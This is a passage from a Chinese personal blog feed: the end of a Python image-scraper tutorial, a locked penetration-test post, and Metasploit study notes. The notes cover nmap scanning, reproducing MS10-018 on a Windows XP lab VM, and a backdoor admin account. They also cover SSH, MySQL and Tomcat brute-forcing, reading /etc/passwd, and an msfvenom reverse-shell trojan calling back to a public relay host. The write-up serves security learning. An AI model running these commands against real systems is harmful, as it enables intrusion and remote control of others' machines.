class="line">        <span class="keyword">elif</span> j&gt;<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst2 <span class="keyword">and</span> i <span class="keyword">not</span> <span class="keyword">in</span> lst:  <span class="comment">#判断新urls里的jpg是否与lst列表里的相同</span></span><br><span class="line">                    lst.append(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;保存图片&#125;</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> lst:</span><br><span class="line">            file_name =<span class="string">&quot;E:/大学/python爬虫/&quot;</span>+ <span class="built_in">str</span>(j) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span>   <span class="comment">#设置文件名</span></span><br><span class="line">            resp = requests.get(url, headers=headers)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:    <span class="comment">#以二进制的方式写进</span></span><br><span class="line">                f.write(resp.content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;正在下载第&#123;0&#125;页第&#123;1&#125;张图片&quot;</span>.<span class="built_in">format</span>(j,x))</span><br><span class="line">            x=x+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#123;计数部分&#125;</span></span><br><span class="line">            <span class="keyword">if</span> x==<span class="built_in">len</span>(lst):</span><br><span class="line">                <span class="keyword">if</span> j != <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">pass</span>        <span class="comment"># 这一部分if指lst2=lst只执行一次，</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lst2 = lst</span><br><span class="line">                x=<span class="number">0</span></span><br><span class="line">                j=j+<span class="number">1</span></span><br><span class="line">                count += <span class="built_in">len</span>(lst)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;下载完成！共下载&#123;0&#125;张图片&quot;</span>.<span class="built_in">format</span>(count))</span><br></pre></td></tr></table></figure></li></ul><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>运行程序</p><p>根据分类可以进行选择下载的类型 选择 <strong>food</strong> 吧</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802111105.png"></p><p>选择页数后，即可下载</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802140217.png"></p><p>打开保存图片的文件夹，下载中……….</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802140330.png"></p><p>如下图，下载完成，显示最终下载数目</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802141548.png"></p><p>如下图，文件夹中塞满了图片，下载完成！</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210802141723.png"></p><h2 id="使用面向对象来爬取"><a href="#使用面向对象来爬取" class="headerlink" title="使用面向对象来爬取"></a>使用面向对象来爬取</h2><p>面向对象也就是通过创建一个类，再创建若干个对象，然后再统一调动，我是在自己之前写的代码基础上进行修改</p><p><strong>代码如下：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlretrieve</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tupian</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.base_url=<span class="string">&quot;https://burst.shopify.com/love?page=&#123;&#125;&quot;</span></span><br><span class="line">        self.header=&#123;<span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36&quot;</span></span><br><span class="line">                     &#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Geturl</span>(<span class="params">self</span>):</span></span><br><span class="line">        all_url = []</span><br><span class="line">        <span class="keyword">for</span> <span class="built_in">str</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line">            all_url.append(self.base_url.<span class="built_in">format</span>(<span class="built_in">str</span>))</span><br><span class="line">        <span class="keyword">return</span> all_url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Respons</span>(<span class="params">self,all_url</span>):</span></span><br><span class="line">        text_list = []</span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> all_url:</span><br><span class="line">            r = requests.get(url, headers=self.header)</span><br><span class="line">            text_list.append(r.text)</span><br><span class="line">        <span class="keyword">return</span> text_list</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clear</span>(<span class="params">self, respons</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> respons:</span><br><span class="line">            qqq = <span class="string">&quot;https://burst.*?jpg&quot;</span></span><br><span class="line">            pi = re.findall(qqq, i)</span><br><span class="line">            lst=[]</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> pi:   <span class="comment">#遍历jpg</span></span><br><span class="line">                <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> lst:</span><br><span class="line">                    lst.append(j)</span><br><span class="line">            <span class="keyword">return</span> lst</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">self, url_list</span>):</span></span><br><span class="line">        x=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">            x = x + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            file_name = <span class="string">&quot;E:/大学/python面向对象爬虫/&quot;</span>+ <span class="built_in">str</span>(x) + <span class="string">&quot;.jpg&quot;</span></span><br><span class="line">            urlretrieve(url, file_name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        titile_url = self.Geturl()</span><br><span class="line">        respons = self.Respons(titile_url)</span><br><span class="line">        picture = self.clear(respons)</span><br><span class="line">        <span class="built_in">print</span>(picture)</span><br><span class="line">        download = self.save(picture)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    tupian = Tupian()</span><br><span class="line">    tupian.run()</span><br></pre></td></tr></table></figure><p>使用效果差不多，但缺少选择分类</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 align = &quot;center&quot;&gt;爬虫笔记&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;爬取burst.shopify.com内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;总体思想&quot;&gt;&lt;a href=&quot;#总体思想&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="爬虫" scheme="https://blog.abinix.top/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>九月境外渗透</title>
    <link href="https://blog.abinix.top/2021/10/28/%E4%B9%9D%E6%9C%88%E5%A2%83%E5%A4%96%E6%B8%97%E9%80%8F/"/>
    <id>https://blog.abinix.top/2021/10/28/%E4%B9%9D%E6%9C%88%E5%A2%83%E5%A4%96%E6%B8%97%E9%80%8F/</id>
    <published>2021-10-28T10:29:38.000Z</published>
    <updated>2021-12-23T17:02:19.043Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">这里要授权哦，请输入密码：</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">文章被加密啦！联系博主吧</summary>
    
    
    
    <category term="-渗透" scheme="https://blog.abinix.top/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>MSF神器</title>
    <link href="https://blog.abinix.top/2021/10/17/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://blog.abinix.top/2021/10/17/MSF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-10-17T13:11:34.000Z</published>
    <updated>2021-12-23T17:24:16.208Z</updated>
    
    <content type="html"><![CDATA[<h1 align = "center">MSF学习笔记</h1><p>[TOC]</p><h1 id="MSF简介"><a href="#MSF简介" class="headerlink" title="MSF简介"></a>MSF简介</h1><blockquote><p>MSF全称伪Metasploit，是一个开源的渗透测试开源软件，也是一个逐步发展成熟的漏洞研究与渗透测试代码开发平台，此外也将成为支持整个渗透测试过程的安全技术集成开发与应用环境</p><p>渗透攻击是目前Metasploit最强大和最具吸引力的核心功能，Metasploit框架中集成了数百个针对主流操作系统平台上，不同网络服务与应用软件安全漏洞的渗透攻击模块，可以由用户在渗透攻击场景中根据漏洞扫描结果进行选择，并能够自由装配该平台上适用的具有指定功能的攻击载荷，然后通过自动化编码机制绕过攻击限制与检测措施，对目标系统实施远程攻击，获取系统的访问控制权。</p></blockquote><p>它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907160136.jpeg"></p><h2 id="MSF的使用"><a href="#MSF的使用" class="headerlink" title="MSF的使用"></a>MSF的使用</h2><p>MSF在kali虚拟机中自带，输入msfconsole就能够进入到控制台操作界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906165852.png"></p><h2 id="MSF模块"><a href="#MSF模块" class="headerlink" title="MSF模块"></a>MSF模块</h2><ul><li><p>exploits模块</p><p>漏洞攻击模块列表，入侵式<br>命名规则<br>模块/系统/服务/名称</p></li><li><p>payloads模块<br>漏洞负载模块与exploits模块配合使用的用于入侵后的操作</p></li><li><p>auxiliary模块<br>辅助模块，通常用于没有攻击荷载的漏洞攻击。</p></li><li><p>encoders模块<br>编码器模块，用于msfvenom -e or<br>msf执行时也可以使用通常用于生成木马等操作。<br>nops（无操作生成器模块）post（开发模块）这两个模块不常用</p></li></ul><h1 id="信息收集模块"><a href="#信息收集模块" class="headerlink" title="信息收集模块"></a>信息收集模块</h1><h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库</p><p>用来查询域名的IP一级所有者的等传输协议，可以直接在网站上查询，也可以使用命令行查询，向请求服务器进行TCP端口43建立连接，发送关键字，然后再接收到服务器查询结果</p><p><strong>命令行查询：whois+域名</strong></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906183327.png"></p><p>上图大致显示了域名，注册ID，注册whois服务器，更新时间，注册时间，注册有效期，注册人等信息</p><h2 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>Nslookup是一个监测网络中DNS服务器是否能正确实现域名解析的命令行工具。</p><p>可以获得服务器的附加信息</p><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906183700.png"></p><p>下面是本地的DNS信息</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><p>可以启动Nmap对目标的IP端口开放情况进行扫描，得知对方的开放端口有哪些，Nmap的扫描结果可以输出在后端数据库中供后续使用。</p><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p><strong>端口扫描</strong></p><p>基础扫描：nmap xxxx</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011442.png"></p><p>如上图是我服务器上的几个活跃端口</p><p>（1）SYN扫描</p><ul><li>命令：nmap -sS 192.168.1.0/24</li><li>说明：仅发送TCP连接中的SYN进行扫描</li><li>判断：返回SYN/ACK应答，表示端口开启；返回RST应答，表示端口关闭。</li></ul><p>（2）Connect扫描</p><ul><li>命令：nmap -sT 192.168.1.0/24</li><li>说明：完成TCP的三次握手阶段进行扫</li><li>判断：建立TCP连接、表示端口开启，否则、表示端口关闭。</li></ul><p>（3）UDP扫描</p><ul><li>命令：nmap -sU 192.168.1.0/24</li><li>说明：使用UDP方式进行扫描。</li><li>判断：无应答、表示端口开启；返回“Port Unreachable（端口无法抵达）”信息，表示端口关闭。</li></ul><p>（4）FIN扫描</p><ul><li>命令：nmap -sF 192.168.1.0/24</li><li>说明：在TCP数据包中置FIN标志位、然后发送数据包、进行扫描。</li><li>判断：无应答、表示端口开启；返回RST应答，表示端口关闭。</li></ul><p>（5）NULL扫描</p><ul><li>命令：nmap -sN 192.168.1.0/24</li><li>说明：在TCP数据包中不包含任何标志、然后发送数据包、进行扫描。</li><li>判断：无应答、表示端口开启；返回RST应答，表示端口关闭。</li></ul><p>（6）Xmas扫描</p><ul><li>命令：nmap -sX 192.168.1.0/24</li><li>说明：在TCP数据包中置FIN、RST、PUSH标志位、然后发送数据包、进行扫描。</li><li>判断：无应答、表示端口开启；返回RST应答，表示端口关闭。</li></ul><p>（7）idle扫描</p><ul><li>命令：假设僵尸机是172.16.1.1，nmap -sI 172.16.1.1 192.168.1.0/24</li><li>说明：利用僵尸机进行跳转完成对目标的扫描。</li><li>判断：当僵尸机返回序列ID增加数量是“2”时、表示端口开启；当僵尸机返回序列ID增加数量是“1”时，表示端口关闭。</li><li>详细说明参见：(<a href="https://link.zhihu.com/?target=https://blog.csdn.net/dong976209075/article/details/7771159">https://link.zhihu.com/?target=https%3A//blog.csdn.net/dong976209075/article/details/7771159</a>)</li></ul><p>（8）指定端口扫描</p><ul><li>命令：nmap -p 端口号 192.168.1.0/24</li><li>示例：nmap -p 80 192.168.1.0/24 , nmap -p 80,443 192.168.1.0/24</li></ul><p>（9）扫描常见的100个端口（即：Fast快速模式）</p><ul><li><p>命令：nmap -F 192.168.1.0/24</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011550.png"></p></li></ul><p>（10）使用协议名字进行扫描</p><ul><li>命令：nmap -p 协议名 192.168.1.0/24</li><li>示例：nmap -p http 192.168.1.0/24 , nmap -p http,smtp 192.168.1.0/24</li></ul><p>（11）扫描常用端口</p><ul><li>命令：nmap –top-ports 端口数量 192.168.1.0/24</li><li>示例：扫描常用的10个端口 nmap –top-ports 10 192.168.1.0/24</li></ul><p>（12）扫描所有端口（效率差，不建议使用）</p><ul><li>命令：nmap -p * 192.168.1.0/24</li></ul><ul><li><p>nmap自定义扫描<br>命令语法：nmap -p(range) <target IP><br>（range）为要扫描的端口范围，端口大小不能超过65535</p></li><li><p>例子：扫描目标主机的20-120号端口<br>nmap -p20-120 173.22.90.10</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011613.png"></p><p>如上图只显示了10000-20000之间的端口</p></li></ul><h3 id="操作系统、服务判断"><a href="#操作系统、服务判断" class="headerlink" title="操作系统、服务判断"></a>操作系统、服务判断</h3><p>1、判断操作系统：nmap -O 192.168.1.0/24</p><p>2、判断服务版本：nmap -sV 192.168.1.0/24</p><p>3、综合判断：nmap -A 192.168.1.0/24</p><h2 id="Portscan"><a href="#Portscan" class="headerlink" title="Portscan"></a>Portscan</h2><p>同为端口扫描，而portscan为msf自带的端口扫描软件</p><p>nmap 扫描方式直接在 msf 中输入相应的 nmap 命令即可，msf 模块扫描方式需要调用 auxiliary 下的 scanner 下的 portscan 下的脚本。</p><h3 id="使用-3"><a href="#使用-3" class="headerlink" title="使用"></a>使用</h3><p>1，查看可以使用的portscan工具（任何一个都可）</p><p>命令：search portscan</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906190818.png"></p><p>2.使用use命令进行syn扫描</p><p>命令：use auxiliary/scanner/portscan/syn</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906190908.png"></p><p>3.portscan扫描需要进行set赋值，具体如下</p><p>命令：set rhosts ip  #设置需要扫描的IP</p><p>命令：set threads 100 #设置线程 与大越快</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011645.png"></p><p>如上图扫出如上存活的端口（时间太长了就停了，还是nmap效率高）</p><p><strong>ps：这里进行portscan需要在root权限下否则会报错</strong>，如下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906191816.png"></p><h2 id="smb-version"><a href="#smb-version" class="headerlink" title="smb_version"></a>smb_version</h2><h3 id="简介smb扫描"><a href="#简介smb扫描" class="headerlink" title="简介smb扫描"></a>简介smb扫描</h3><blockquote><p>server message block协议，Windows特有的一个协议，实现较复杂，windows应用最广的一个协议，也是安全问题最多的问题，smb协议windows默认开发，用于文件共享。</p><p>smb_version用来扫描获取系统信息</p></blockquote><h3 id="使用-4"><a href="#使用-4" class="headerlink" title="使用"></a>使用</h3><p>1.查找</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907144142.png"></p><p>2.利用</p><p>命令：use auxiliary/scanner/smb/smb_version</p><p>3.进行set（设置的参数名与端口扫描的一样）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011714.png"></p><h2 id="ssh-version"><a href="#ssh-version" class="headerlink" title="ssh_version"></a>ssh_version</h2><p>如果主机运行SSH，可以对SSH版本进行识别。很多SSH版本中都发现安全漏洞。通过msf框架的ssh_version模块来识别SSH版本。</p><p>使用方法相同，这里不多赘述</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011740.png"></p><p>如上图，显示了此服务器的ssh版本信息</p><h2 id="arp-sweep"><a href="#arp-sweep" class="headerlink" title="arp_sweep"></a>arp_sweep</h2><p><strong>arp_sweep</strong>使用ARP请求枚举本地局域网络中的<strong>所有活跃主机</strong>。 udp_sweep通过发送UDP数据包探查指定主机是否舌跃，并发现主机上的UDP服务</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011806.png"></p><p>因为是自己的服务器，所以也只能有存活一台</p><h1 id="漏洞利用模块"><a href="#漏洞利用模块" class="headerlink" title="漏洞利用模块"></a>漏洞利用模块</h1><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>search</strong> 查找命令，用来在msf框架中寻找需要的模块</p><p>例如：search ms08_067  查找关于ms08_067的漏洞模块</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906195821.png"></p><p><strong>use</strong> 载入模块命令 使用use跟上工具的路径即可载入</p><p><strong>show payloads</strong> 显示所有的攻击载荷，也就是显示可以利用的payload</p><p><strong>exploits</strong> 利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动），也就是开始使用模块</p><p><strong>sessions</strong> 查看当前已经建立的sessions，说明已经拿到了shell</p><p><strong>show auxiliary</strong> 会显示Metasploit框架中所有可用的渗透攻击模块。在MSF终端中，你可以针对渗透测试中发现的安全漏洞来实施相应的渗透攻击。</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906202022.png"></p><p>如上图所示，有一千多个可以利用的渗透攻击模块</p><h3 id="漏洞复现（MS10-018）"><a href="#漏洞复现（MS10-018）" class="headerlink" title="漏洞复现（MS10-018）"></a>漏洞复现（MS10-018）</h3><p>Microsoft IE跨域信息泄露漏洞</p><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>1.下载windows XP虚拟机镜像</p><p> <a href="https://pan.baidu.com/s/1eStTCMu">https://pan.baidu.com/s/1eStTCMu</a> 密码：7y26</p><p>2.vm安装虚拟机 </p><p>ps:这里推荐用自定义安装，使用典型安装会造成错误，这篇文章比较详细 <a href="https://blog.csdn.net/linxinfa/article/details/112768896?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows%20xp%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-112768896.nonecase&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/linxinfa/article/details/112768896?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=windows%20xp%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-112768896.nonecase&amp;spm=1018.2226.3001.4187</a></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908111007.png"></p><p>3.将ios文件导入并开机</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908135544.png"></p><p>​    成功安装靶机</p><p>靶机：Windows XP系统 192.168.220.135</p><p>攻击机：kali Linux系统 192.168.220.132</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908135440.png"></p><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p>尝试两台主机能否ping通</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908142502.png"></p><p>经过验证是可以的（这里用kali2019版本的，20版本出了点小问题）</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><ul><li>首先打开kali的msf，找到MS10-018模块</li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908155239.png"></p><ul><li><p>载入模块并进行设置</p><p>1.设置payload</p><p>2.set SRVHOST 192.168.220.132 （攻击机ip）#设置一个ip便于xp访问</p><p>3.set URIPATH ms10_018.html #设置初始页面</p></li></ul><p>![image-20210908160341155](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210908160341155.png)</p><ul><li>explot进行攻击</li></ul><p>![image-20210908161117055](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210908161117055.png)</p><p>​    如上图，准备就绪，可以看到框框中有个url，这个就是可利用的网址，我们在windows xp中输入</p><ul><li><p>打开windows xp上的ie浏览器，输入网址</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908161328.png"></p><p>可以很明显的看到浏览器很卡，这说明利用成功，造成了浏览器的崩溃，</p></li><li><p>返回kali中，可以看到已经利用成功，接下来监听这个会话，进行提权</p><p>set LHOST 192.168.22.132 #目标主机被控制后反弹的地址</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908161454.png"></p></li></ul><ul><li><p>输入payload sessions监听</p><p>![image-20210908161837845](C:\Users\Pro 13\AppData\Roaming\Typora\typora-user-images\image-20210908161837845.png)</p><p>可以看到有一台windows的机器</p></li><li><p>使用命令 <strong>sessions -u id</strong> 命令进行提权</p></li></ul><blockquote><p>升级一个普通的win32 shell到metasploit shell。</p></blockquote><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908163935.png"></p><ul><li><p>提权成功，进入交互模式</p><p>命令：sessions -i 1</p></li></ul><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908164616.png"></p><p>如图所示，成功拿下权限，可以ipconfig看一下</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908164646.png"></p><p>已经具有metasploit shell</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908165129.png"></p><ul><li><p>添加root用户</p><p>命令：net user root 123456 /add</p><p>net localgroup Administrator root /add #提升root用户权限至Administrator用户组</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210908165044.png"></p><p>如图成功添加root权限</p></li></ul><h1 id="密码破解模块"><a href="#密码破解模块" class="headerlink" title="密码破解模块"></a>密码破解模块</h1><h2 id="ssh-login"><a href="#ssh-login" class="headerlink" title="ssh_login"></a>ssh_login</h2><p>就是一个破解ssh连接的模块，使用自带的字典</p><h3 id="使用-5"><a href="#使用-5" class="headerlink" title="使用"></a>使用</h3><p>1.寻找模块</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210906202515.png"></p><p>2.载入模块</p><p>use ……</p><p>3.绑定靶机，这里用服务器</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011851.png"></p><p>4.设置账号密码文件（爆破的字典）</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907081115.png"></p><p>这里事先创建了两个字典用作演示</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011914.png"></p><p>user_file为用户名的字典路径</p><p>pass_file为密码的字典路径</p><p>exploit进行执行</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907081533.png"></p><p>如上图 得到服务器的系统信息</p><h3 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h3><p><strong>查询会话方面的信息</strong></p><p>sessions -i</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224011945.png"></p><p><strong>打开会话</strong><br>session -i ID</p><p><strong>查看密码文件</strong></p><p>cat /etc/passwd</p><h2 id="mysql-login"><a href="#mysql-login" class="headerlink" title="mysql_login"></a>mysql_login</h2><p>用来破解mysql，用法与上述的ssh破解一样，这里代码演示</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211224012012.png"></p><h2 id="postgres-login"><a href="#postgres-login" class="headerlink" title="postgres_login"></a>postgres_login</h2><p>PostgreSQL是一个自由的对象——<strong>关系数据库服务（数据库管理系统）</strong>。它在灵活的BSD-风格许可证下发行。</p><p>用法相同，在特定情况下使用</p><h2 id="Tomcat-mrg-login"><a href="#Tomcat-mrg-login" class="headerlink" title="Tomcat_mrg_login"></a>Tomcat_mrg_login</h2><p>用来爆破tomcat弱口令</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907094049.png"></p><p>用法相同，先找到tomcat的模板，进行 set ip即可，不多赘述了</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907094409.png"></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907094324.png"></p><h2 id="telent-login"><a href="#telent-login" class="headerlink" title="telent_login"></a>telent_login</h2><p>Telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用Telnet服务</p><p>telent_login是一个telent破解的模块</p><p>使用与上述的破解模块相同，字典够强大即可</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20210907095629.png"></p><h1 id="MSF木马生成"><a href="#MSF木马生成" class="headerlink" title="MSF木马生成"></a>MSF木马生成</h1><h2 id="常规木马"><a href="#常规木马" class="headerlink" title="常规木马"></a>常规木马</h2><p>命令：<code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=frp3.freefrp.net LPORT=46899 -f elf -o abin.elf</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129221011.png"></p><p>生成成功</p><h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p>使用msf的监听模块</p><p><code>use exploit/multi/handler</code></p><p><code>set payload linux/x64/meterpreter/reverse_tcp</code> #windows则把linux换为windows即可</p><p><code>set lhost 192.168.220.129</code></p><p><code>set lport 4567</code></p><p><code>run</code></p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129221341.png"></p><p>在目标机中打开制作好的木马</p><p><img src="https://abing.oss-cn-beijing.aliyuncs.com/imgs/20211129221639.png"></p><p>本机收到回响，成功上线</p><p><img 